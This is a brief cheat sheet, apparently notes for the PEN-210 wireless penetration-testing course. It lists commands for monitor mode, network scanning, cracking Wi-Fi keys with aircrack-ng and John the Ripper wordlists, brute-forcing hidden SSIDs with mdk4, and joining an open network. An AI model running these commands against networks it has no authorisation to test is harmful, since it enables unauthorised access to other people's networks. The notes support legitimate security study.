# PEN-210
=== put wifi card in monitor mode ===
airmon-ng check kill  # kill services
airmon-ng start wlan0  # monitor mode (wlan0 > wlan0mon)
# airmon-ng stop wlan0mon  # stops monitor mode (wlan0)

=== scan network ===
airodump-ng wlan0mon -w ./wifi/scan --manufacturer --wps --band abg
airodump-ng wlan0mon -w ./wifi/scan --manufacturer --wps -c11  # scan specified channel

=== cracking ESSID with JTR ===
john --wordlist=/usr/share/john/password.lst --rules --stdout | aircrack-ng -e <essid> -w - ./wifi/scans

=== find hidden APs (given ESSID) ===
tar -xvf /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz -C .  # grab rockyou from seclist
cat rockyou.txt | awk '{print "wifi-" $1}' > wifi-rockyou.txt  # modify rockyou.txt to include "wifi-" prefix
iwconfig wlan0mon channel 11  # change channel wlan0mon is running on (check the channel via airodump-ng)
mdk4 wlan0mon p -t <essid> -f wifi-rockyou.txt  # using mdk4 to bruteforce ssid

=== connecting to OPN network ===
# edit free.conf
network={
	ssid="$ESSID"
	key_mgmt=NONE
	scan_ssid=1
}

wpa_supplicant -Dnl80211 -iwlan2 -c free.conf
dhclient wlan2 -v

